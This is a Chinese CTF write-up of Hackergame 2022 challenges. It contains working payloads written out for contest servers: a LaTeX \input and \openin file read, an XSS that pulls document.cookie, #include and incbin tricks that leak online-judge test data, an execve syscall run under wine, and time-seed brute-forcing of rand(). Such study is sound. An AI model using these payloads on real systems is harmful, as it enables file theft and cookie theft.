来自中科大的CTF题目，质量很好，慢慢复现学习。官方WP：https://github.com/USTC-Hackergame/hackergame2022-writeups



## 签到-Web

进入网页，是如下画面：

![1](D:\CTF\Hackergame2022\pic\1.jpg)

能在上边写字，随便写了些东西然后提交了。burpsuite抓包看包的内容，改成2022即可拿下。



## 猫咪问答喵-Misc

社工题，进入网页后是如下表格。

![2](D:\CTF\Hackergame2022\pic\2.jpg)

看了看以前的题解，使用搜索引擎+眼睛来找相关信息，找了前三个，后三个没找。后三题的寻找方法看WP吧，这里就不多说了。



## Xcaptcha-Web

网页进入后为如下画面

![3](D:\CTF\Hackergame2022\pic\3.jpg)

点击button，进入一个验证界面，然后还没等输入验证，界面就自己退出了。用burpsuite拦下相关包，审计源码，发现源码中有如下代码触发了自动提交。

```
    <script>
      setTimeout(function() {
        document.getElementById('submit').click();
      }, 1000);
    </script
```

于是修改这里的自动提交时间，改成了10000000，进入网页后就不会这么快提交了。

然后填好表单，提交。服务器返回为：超过1秒时间限制。看来是在服务器上有相关的措施限制1秒访问了。

我想到了写脚本，因为之前写过的一道CTF题是补全发送包的，所以猜测这道题应该也是要写一个发包的脚本。这个脚本要自己获取包然后计算里边的大数。思路有了，但我不会写，真是废物啊。

官方题解和我想的一样，脚本如下：

```
import requests

s = requests.Session()#创建session
s.get("http://202.38.93.111:10047/?token=2157:MEUCIQDcGPYbGeIjc6zWKIQbeYMgffANcUXHV8uepwFiEIMOYgIgRPO1nKwtWjiz99V1GNDgAHiQpwIQe/stgtrKfOZVih4=")#这个是链接到题目平台的，题目需要有token才运行登录
x = s.get("http://202.38.93.111:10047/xcaptcha")#获取题目的包
x = [i.split(">")[1] for i in x.text.split("\n") if "的结果是" in i]
# print(x)
x = [i.split()[0].split("+") for i in x]
print(x)
x = [int(i[0]) + int(i[1]) for i in x]
print(x)
payload = {"captcha1": x[0], "captcha2": x[1], "captcha3": x[2]}
x = s.post("http://202.38.93.111:10047/xcaptcha", data=payload)
print(x.text)
```

自己模仿思路写的脚本，没官方的那么优雅：

```
import requests

s = requests.Session()
s.get("http://202.38.93.111:10047/?token=2157:MEUCIQDcGPYbGeIjc6zWKIQbeYMgffANcUXHV8uepwFiEIMOYgIgRPO1nKwtWjiz99V1GNDgAHiQpwIQe/stgtrKfOZVih4=")
x = s.get("http://202.38.93.111:10047/xcaptcha")
#print(x.text.split('\n'))
ans=[]
k=0
for i in x.text.split('\n'):
    if '的结果是' in i:
        ans.append(i.split('>')[1])
print(ans)
t=[]
for i in ans:
    temp=i.split(' ')[0].split('+')
    t+=temp
print(t)
ans1=int(t[0])+int(t[1])
ans2=int(t[2])+int(t[3])
ans3=int(t[4])+int(t[5])
payload={'captcha1':ans1,'captcha2':ans2,'captcha3':ans3}
x=s.post("http://202.38.93.111:10047/xcaptcha", data=payload)
print(x.text)
```

还有另外一种做法，用无头浏览器（模拟浏览器，如selenium）提交相关表单，无头浏览器的脚本参见Github的WP。不过这道题用无头浏览器确实有些小题大做了，但一些特殊情况下还是很好使的。



## 旅行照片2.0-Misc

又是一道社工题，是一张手机照片。第一题就是拿这张照片去一些网站上查看，当然在PC上也能通过相关软件拿到这些信息。我不满意的是EXIF信息这里在网站上查到的是2.3.1，而题目却是2.31。这种外在因素导致题目做不出来真的挺烦的。

![4](D:\CTF\Hackergame2022\pic\4.jpg)

第二题难度高些，毕竟涉及了地理位置分析等因素。这些可以参考B站上边那些分析照片的UP主，Google地图肯定是需要的，然后还需要仔细识别照片元素。社工就是这样了。

![5](D:\CTF\Hackergame2022\pic\5.jpg)



## 家目录里的秘密-Misc

下载下来的是一个文件夹，根据题目的意思，这应该就是一个Project的文件夹了。

![6](D:\CTF\Hackergame2022\pic\6.jpg)

然后，题目给了两个提示：

1、VS Code 里的 flag

2、Rclone 里的 flag

那不必多说，用VS Code 打开这个文件夹。寻找 flag 的话是在左侧项目区向文件夹里边进行发起寻找。然后就会得到VS Code 内的flag。但是如果在 Windows 目录下进行寻找的话很难第一时间找到。

这道题的原理是因为 VS Code 在打开“本地编辑历史”功能后，便会自动保存相关文件，可以在 Timeline 里边看到保存记录。

第二小题就是找Rclone相关的文件，在.config里边可以发现rclone的配置文件，密码栏里的一串字符就是flag了。

然后对这串字符解密。由于 rclone 并没有问我们要其它的方法去加密存储的密码，在实际连接的时候，它必须需要原始的密码。由此可以断定，这串字符就是被混淆了的，而且解密的脚本就在 rclone 的文件里边。

上Github 在 rclone 里搜 obscure ，便能找到破解脚本。使用 Go 语言调用脚本即可（这里配置的时候要装git，我没装）：

```
package main

import (
        "fmt"
        "github.com/rclone/rclone/fs/config/obscure"
)

func main() {
        fmt.Println(obscure.MustReveal("tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ"))
}
```



## HeiLang-Misc

题目给了一个转换规则。原题如下：

[^]: 来自 Heicore 社区的新一代编程语言 HeiLang，基于第三代大蟒蛇语言，但是抛弃了原有的难以理解的 `|` 运算，升级为了更加先进的语法，用 `A[x | y | z] = t` 来表示之前复杂的 `A[x] = t; A[y] = t; A[z] = t`。作为一个编程爱好者，我觉得实在是太酷了，很符合我对未来编程语言的想象，科技并带着趣味。

后边这句实在是太搞了。

回到题目，已经了解了转换规则。题目还给了一个python附件，里边就是用这种转换规则写出来的东西。运行一下，超出了list的范围。而WP给的题解是要把这些新语法改成旧语法。原本我还以为会涉及AST之类的东西，但看了题解确实没有，只有简单的字节替换。

替换是把 | 换成 ]=a[ 即可，无需写脚本，VS Code ctrl+shift+L 修改即可

题目来源真的很抽象，你永远不知道有些题目到底是怎么出出来的。

题目来源的仓库：https://github.com/kifuan/helang

也可以用仓库里的结构来解题。





## 猜数字-Misc

启动后是一个猜数字游戏。

![7](D:\CTF\Hackergame2022\pic\7.jpg)

玩了一会儿，感觉一次猜中非常困难，和中彩票差不多的概率。

有源码，审计一下看看。但说实话，看了源码也只是猜数字。因为随机数生成在服务器那边，判断也在那边，所以流程上做不了什么操作。

看WP，考得很刁钻，考点是 IEEE 754 标准定义的浮点数并不满足数学上的全序关系。

[^全序关系]: 1、非自反性：对于任意 `a`，均有 `a < a` 不成立。2、传递性：对于任意 `a`、`b`、和 `c`，均有 `a < b` 且 `b < c` 蕴含 `a < c` 成立。3、完全性：对于任意 `a` 和 `b`，均有 `a ≠ b` 蕴含 `a < b` 或 `b < a` 成立。

但是，在计算机中，NaN 是不满足这个关系的，因为第三条不满足。对于任意的`a`来说， `a ≠ NaN` 成立，但 `a < NaN` 或 `NaN < a` 均不成立。NaN（Not a Number）。

```
var isLess = guess < this.number - 1e-6 / 2;
var isMore = guess > this.number + 1e-6 / 2;
var isPassed = !isLess && !isMore;
```

isPassed 满足调节不仅仅是正确的number，还可以是 NaN，经过判断后返回 False，然后被逆转为 True。

JAVA内的NaN判断如下，参考：https://www.baeldung.com/java-not-a-number

```
NaN == 1 = false
NaN > 1 = false
NaN < 1 = false
NaN != 1 = true
NaN == NaN = false
NaN > NaN = false
NaN < NaN = false
NaN != NaN = true
```





## LaTex机器人-Web

输入LaTex语句输出LaTex图片，确实很好的东西。

题目还给了后端生成的代码，多说无益，代码审计环节。

```
import subprocess
import base64
import sys

if __name__ == "__main__":
    latex = input("LaTeX Expression: ")
    with open("/dev/shm/input.tex", "w") as f:
        f.write(latex)#将语句写入tex文件中
    output = subprocess.run(
        ["su", "nobody", "-s", "/bin/bash", "-c" "/app/latex_to_image_converter.sh /dev/shm/tmp.png"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if output.returncode != 0:
        print("输入解析失败！请检查输入语法。")
        print(output.stderr)
        print(output.stdout)
    else:
        with open("/dev/shm/tmp.png", "rb") as f:
            print(base64.b64encode(f.read()).decode('utf-8'))

```

那么得去查查LaTex的语法，LaTex的读取语法如下：

\doucment{article}

于是输入\input{/flag1}就能解第一道题了

第二道题，由于LaTex语法不支持直接输出 # 和 _ ，所以得用点巧劲。 

题解给的是 \detokenize  方法：将字符串转义为 LaTeX 可以直接输出的形式（一般是在特殊符号前自动补反斜杠）

```
payload：$$\newread\myread \openin\myread=/flag2 \read\myread to\fileline \detokenize\expandafter{\fileline}$$
```

除此之外，关于 LaTex RCE、XSS等之类的操作可参考这篇文章：https://zhuanlan.zhihu.com/p/455901476

绕过可参考：https://blog.noah.360.net/tex-restricted-mode-bypass/



## Flag的痕迹-Web

一道考察软件的题目。这种题目的做法最好是弄个软件下来实操，而且题目也给了相关的版本，用相应版本进行一下操作就能更好的理解怎么破解。

操作的时候注意URL的变化

当进入media页面，上边的URL如下：

![8](D:\CTF\Hackergame2022\pic\8.jpg)

进入login变化如下：

![9](D:\CTF\Hackergame2022\pic\9.jpg)

合理怀疑是 do 这个参数导致了跳转。

把参数改成 revisions ， 报错。那没辙，找找 dokuwiki 会显示历史记录的页面。这种在 google 上搜不到的话就在软件上慢慢找。然后发现 diff 页面可以看到网页的修改记录。

打开 diff，翻一翻，就找到了 flag





## 安全的在线测评-Misc

题目如下：

> **无法 AC 的题目**
>
> 为了验证他写的新 OJ 的安全性，他决定在 OJ 上出一道不可能完成的题目——大整数分解，并且放出豪言：只要有人能 AC 这道题，就能得到传说中的 flag。当然，因为目前 OJ 只能运行 C 语言代码，即使请来一位[少年班学院的天才](https://github.com/ustclug/hackergame2018-writeups/tree/master/official/RSA_of_Z#解法-1)恐怕也无济于事。
>
> **动态数据**
>
> 为了防止数据意外泄露，小 L 还给 OJ 加入了动态数据生成功能，每次测评会随机生成一部分测试数据。这样，即使 OJ 测试数据泄露，攻击者也没办法通过所有测试样例了吧！（也许吧？）
>
> 判题脚本：[下载](https://hack.lug.ustc.edu.cn/media/0fd509cd-9f1a-588a-b45e-a11331006a3f/online_judge.py)
>

直接在浏览器页面打开题目，确实是一个 OJ 平台，可以在上边写程序，只是界面真的很丑。

题目给了脚本，审计，发现flag需要AC才能拿到。但是AC需要过数据的检测，如何过数据的检测呢？

没办法，看WP吧。WP提到这道题是考察**编译期未加权限限制导致的数据泄露**。然后再看看题目给的提示脚本，可以知道测试的时候是有两种类型的数据在参与运行的，分别是位于 ./data/static.out 的静态数据以及位于 ./data/dynamic{i}.in/out 的动态数据。

#### 无法AC的题目

static.in存入的是 user 输入的代码数据，输入完成后会进行路径检查，此时会报告路径相关错误。看源码我们能知道ans在读取static.out数据的时候进行了取中间（strip操作）和分割行（split操作），那static.out里边应该是一行行的字符串这样的东西。读取看看。

payload如下：

```
#include "../data/static.out"

int a =
#include "../data/static.out"

以及读第三行的payload：
int a =

#include "../data/static.out"



注：
#include "" 不属于标准库的头文件，编译器去项目的文件目录查找头文件。
```

这里发现读到第三行的时候还是第二行的数据，以及题目的换行暗示也提醒了这个文件里边包含的字符串行数很少。

行吧，看看读取出来的字符，是两组数字。合理猜测是AC所需要的数组。写相应程序执行即可。

#### 动态数据

这一小题的动态数据是在每一次编译前生成的，这意味着我们需要一次提交来获得所有动态数据。那么之前过静态数据的方法就不太好用了。看题解，题解说明可以在编译器将二进制文件弄成const char 或者 string 格式输出。在汇编中有一个指令可以包含相应文件，就是INCBIN指令，该指令可以以不进行汇编的形式把源文件包含进入汇编代码中。以这个思路，然后我们再把包含在汇编代码中的源文件输出即可。

但官方并没有相关函数可以做类似操作，出题人是用了Github上incbin项目的代码。说实话有点为了出题而出题了。

参考paylod：

```
#include "incbin.h"

#define PATH_PREFIX "./data/dynamic"
#define inc_in(i) INCTXT(in##i, PATH_PREFIX #i ".in")
#define inc_out(i) INCTXT(out##i, PATH_PREFIX #i ".out")

inc_in(0);
inc_in(1);
inc_in(2);
inc_in(3);
inc_in(4);#先把paylaod包含进入文件中
inc_out(0);
inc_out(1);
inc_out(2);
inc_out(3);
inc_out(4);#输出

const char *in[5] = {gin0Data, gin1Data, gin2Data, gin3Data, gin4Data};
const char *out[5] = {gout0Data, gout1Data, gout2Data, gout3Data, gout4Data};

```



## 线路板-Misc

题目给了一堆CAD文件，文件格式是GER，那下一个Gerber查看器查看就行。

Flag在 ebaz_sdr-F_Cu.gbr 里边，用Gerber查看器可以点击高亮。

在线的只能看不能点：https://viewer.digipcba.com/viewer/



## Flag自动机-Reverse

逆向签到题，说实话有点难。

以静态分析截取数据，然后解密的方法是最麻烦的，因为要处理IDA的编译错误问题。在相关函数里边注意一下output栏，回弹栈不平衡警告，这个时候就要去看汇编代码找IDA报错的位置修改函数的相关参数。

其余方法利用了修改程序逻辑或者借用Win32 API，具体参考WP。

#### Win32 API 解法

这个解法就是看程序说话，flag想要什么就给什么。IDA打开程序，可以看到如下代码：

![10](D:\CTF\Hackergame2022\pic\10.jpg)

这里直接显示出几个关键函数了，sub_401510是控制flag输入的，而SetWindowSubclass是用于做窗口飞来飞去的效果。

看有关flag的函数，点进去，函数如下：![11](D:\CTF\Hackergame2022\pic\11.jpg)

看前几步就够了。首先，在前面调用sub_401510的部分，调用的时候没有输入参数。但是现在在函数内出现了相关参数，还是被输入进来的。而且从这些参数很容易看出，要符合相关才能进入flag判定程序，说明我们得去找找这些参数是哪儿来的。

在这里得引入 Win GUI 的相关的信息。

[^]: 在 Windows 操作系统中，**窗口（Window）**的定义是抽象的。对于一个 Windows 下的 GUI 程序来说，不仅仅只有那个大大的对话框是窗口，对话框中的一个按钮，一段文本，一个输入框，都算作是一个窗口。每个 Windows 下的 GUI 程序都至少会创建一个窗口，它充当用户与应用程序之间的主接口，称为**主窗口**。
[^]: 窗口有这样一些特性：每个窗口都由一个被称为**窗口句柄（Window Handle）**的整数唯一标识每个窗口都有一个**窗口过程（Window Procedure）**，它是一个回调函数，在窗口接收到消息时，这个回调函数就会被调用。
[^]: Windows 下的 GUI 程序是**事件驱动**的。在 Windows 下，用户敲击键盘、移动鼠标、点击鼠标按钮、改变窗口尺寸，这些操作都算作是一个**事件（Event）**。当有事件发生的时候，Windows 就会生成一条消息，将其放入相应应用的**消息队列**中。每个 GUI 程序都必须负责处理自己的消息队列，处理消息队列的逻辑被称为**消息循环（Message Loop）**

而从第一张图我们不难看出，在进入消息循环之前创建窗口组件的时候，我们可以向这些组件发送相关消息，这样就能触发flag出现了。

脚本如下：

```
#include <windows.h>
#include <stdio.h>

int main(void){
    HWND target = NULL;

    // 获取窗口句柄
	target = FindWindowW(L"flag 自动机", L"flag 自动机");
	
    if (target == NULL){
        printf("error!");
        return -1;
    }
    printf("0x%x", target);

    // 发送消息
    PostMessageW(target, 0x111, 3, 114514);
    return 0;
}
```



#### 解法二

如果说我们不输入这些相关的数字去触发flag，反而修改程序逻辑来进行触发。这也是可以的。那么要修改的地方有以下几个：

1、防止窗口乱跑。要么让窗口不动，要么让flag窗口的东西在另一个窗口执行。我们让窗口不动，那就改SetWindowSubclass里的数值。改成273就不动了。

2、flag检查的地方把对应数字全部改成不对应的情况，这样就能越过检查触发flag。

![12](D:\CTF\Hackergame2022\pic\12.jpg)





## 微积分计算小练习-Web

给了两个网站和一个py文件。看了看两个网站之间的关联，首先要在微积分网站这边做题，做完题后需要把链接复制到第二个网站内。

代码审计如下：

```
# Copyright 2022 USTC-Hackergame
# Copyright 2021 PKU-GeekGame
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

from selenium import webdriver
import selenium
import sys
import time
import urllib.parse
import os
# secret.py will NOT be revealed to players
from secret import FLAG, BOT_SECRET

LOGIN_URL = f'http://web/?bot={BOT_SECRET}'

print('Please submit your quiz URL:')
url = input('> ')

# URL replacement
# In our environment bot access http://web
# If you need to test it yourself locally you should adjust LOGIN_URL and remove the URL replacement source code
# and write your own logic to use your own token to "login" with headless browser
parsed = urllib.parse.urlparse(url)
parsed = parsed._replace(netloc="web", scheme="http")
url = urllib.parse.urlunparse(parsed)

print(f"Your URL converted to {url}")

try:
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox') # sandbox not working in docker
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--user-data-dir=/dev/shm/user-data')
    os.environ['TMPDIR'] = "/dev/shm/"
    options.add_experimental_option('excludeSwitches', ['enable-logging'])

    with webdriver.Chrome(options=options) as driver:
        ua = driver.execute_script('return navigator.userAgent')
        print(' I am using', ua)#浏览器参数

        print('- Logining...')#注意了一下输出，上方的浏览器参数和此处的logining是同时出现的
        driver.get(LOGIN_URL)#也许是调用相关页面做flag处理
        time.sleep(4)

        print(' Putting secret flag...')
        driver.execute_script(f'document.cookie="flag={FLAG}"')#在另一个URL页面内，flag被写到了cookie里边
        time.sleep(1)#execute_script:同步执行JavaScript

        print('- Now browsing your quiz result...')
        driver.get(url)
        time.sleep(4)

        try:
            greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
            score = driver.execute_script(f"return document.querySelector('#score').textContent")
        except selenium.common.exceptions.JavascriptException:
            print('JavaScript Error: Did you give me correct URL?')
            exit(1)

        print("OK. Now I know that:")
        print(greeting)#名称
        print(score)#得分输出

    print('- Thank you for joining my quiz!')

except Exception as e:
    print('ERROR', type(e))
    import traceback
    traceback.print_exception(*sys.exc_info(), limit=0, file=None, chain=False)

```

好吧，能看出flag在document.cookie里边，剩下的就是调用这个东西。我们能操控的只有greeting和score两个参数。看回第一个页面的成绩处，可以发现页面输出greeting这里是拼接的。

![13](D:\CTF\Hackergame2022\pic\13.jpg)

试试XSS，报错了，可以。那就直接XSS拿cookie了。

payload：

```
<img src=a onerror="document.getElement('greeting').textContent=document.cookie"/>
100:<img src=1 onerror="document.querySelector('#greeting').innerHTML=document.cookie">
```



### 杯窗鹅影-Reverse-准确来说应该是PWN

> 为了验证这一点，你需要点击「打开/下载题目」按钮，上传你的程序实现以下的目的：
>
> 1. `/flag1` 放置了第一个 flag。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来读取到第一个 flag 吗？
> 2. `/flag2` 放置了第二个 flag，但是需要使用 `/readflag` 程序才能看到 `/flag2` 的内容。你能给出一个能在 wine 下运行的 x86_64 架构的 Windows 命令行程序来执行 `/readflag` 程序来读取到第二个 flag 吗？

这题给了wine这个框架，可以按提示所说，在ubuntu上边配置wine来写一写看看效果。但说实话并不需要这么麻烦，看看题目页面：

![14](D:\CTF\Hackergame2022\pic\14.jpg)

很明显，我们只需要提交一个exe文件来执行相关功能即可。所以这一道题其实不下wine来理解代码功能也行的。

#### 第一题

win下C语言的任意文件读取，很简单。

代码：

```
#include <stdio.h>

int main() {
	FILE *fp = NULL;
	char buff[255];
	fp = fopen("/flag1", "r");
	fgets(buff, 255, (FILE *)fp);
	printf("%s\n", buff );
	fclose(fp);
	return 0;
}
```

#### 第二题

直接改第一题参数是不行的（那肯定的吧），读一下/readflag程序看看

![15](D:\CTF\Hackergame2022\pic\15.jpg)

输出了一些东西，应该是文件类型之类的？看来不能用第一题的思路来弄。题目也说了是要执行这个文件。这里我要否决之前的思路，之前我认为需要执行这个ELF文件，但实际上不管它是EXE还是ELF，都是PE文件，我们要做的只有执行这个文件就行了。

看WP，执行文件需要syscall，那就用内联汇编来弄吧！

[^注]: syscall() 执行一个系统调用，根据指定的参数number和所有系统调用的汇编语言接口来确定调用哪个系统调用

```
#include <stdio.h>

int main() {
    char *filename = "/readflag";
    printf("filename: %p\n", filename);
    __asm__ ("mov %0, %%rdi \n\t"     // filename
             "mov $0, %%rsi \n\t"     // argv (NULL)
             "mov $0, %%rdx \n\t"     // envp (NULL)
             "mov $59, %%rax \n\t"    // execve(2)
             "syscall"
             :: "m"(filename)
             : "%rax", "%rdi", "%rsi", "%rdx"
             );
    return 0;
}
```



## 蒙特卡罗轮盘赌-Crypto

给了代码文件，审计代码

```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

double rand01()
{
	return (double)rand() / RAND_MAX;
}

int main()
{
	// disable buffering
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	srand((unsigned)time(0) + clock());//随机数生成策略
	int games = 5;
	int win = 0;
	int lose = 0;
	char target[20];//系统生成的数字
	char guess[2000];//用户猜测数字
	for (int i = games; i > 0; i--) {
		int M = 0;
		int N = 400000;
		for (int j = 0; j < N; j++) {
			double x = rand01();
			double y = rand01();
			if (x*x + y*y < 1) M++;
		}
		double pi = (double)M / N * 4;
		sprintf(target, "%1.5f", pi);
		printf("请输入你的猜测（如 3.14159，输入后回车）：");
		fgets(guess, 2000, stdin);
		guess[7] = '\0';
		if (strcmp(target, guess) == 0) {
			win++;
			printf("猜对了！\n");
		} else {
			lose++;
			printf("猜错了！\n");
			printf("正确答案是：%1.5f\n", pi);
		}
		if (win >= 3 || lose >= 3) break;
	}
	if (win >= 3) {//猜中三次即可获胜
		printf("胜利！\n");
		system("cat /flag");
	}
	else printf("胜败乃兵家常事，大侠请重新来过吧！\n");
	return 0;
}

```

这种随机数生成方法是基于启动时间来做的，记得之前信安实验就有类似的问题，当时老师还问了我们为什么没有做随机数的处理。回到题目，这种做随机数处理的方法就是调用后根据时间来生成，所以可以在本机跑出结果，然后再把答案复制到题目里边。

这里参考的代码来自：https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/players/Misaka13514/wp.md

修改的原代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

double rand01() { return (double)rand() / RAND_MAX; }

int main(int argc, char **argv) {
  // disable buffering
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  unsigned long seed = (unsigned)time(0) + clock();
  if (argc > 1) {
    seed = atoi(argv[1]);
  }
  srand(seed);

  int games = 5;
  int win = 0;
  int lose = 0;
  char target[20];
  char guess[2000];
  for (int i = games; i > 0; i--) {
    int M = 0;
    int N = 400000;
    for (int j = 0; j < N; j++) {
      double x = rand01();
      double y = rand01();
      if (x * x + y * y < 1)
        M++;
    }
    double pi = (double)M / N * 4;
    sprintf(target, "%1.5f", pi);
    guess[7] = '\0';
    printf("%1.5f,", pi);
  }
  printf("\n");
  return 0;
}
```

使用python调用：

```
import os
import time
def getans(seed):
    ans = os.popen(f"./pwncarlo {seed}").read().strip()[:-1].split(",")
    return ans  # list of 5 answers
monte_carlo = []
time_stamp = int(time.time())
for seed in range(time_stamp - 1000, time_stamp + 1500):
    print(seed)
    monte_carlo.append(getans(seed))

with open("monte_carlo.txt", "w") as f:
    for i in monte_carlo:
        f.write(",".join(i) + "\n")
```



## 二次元神经网络-Web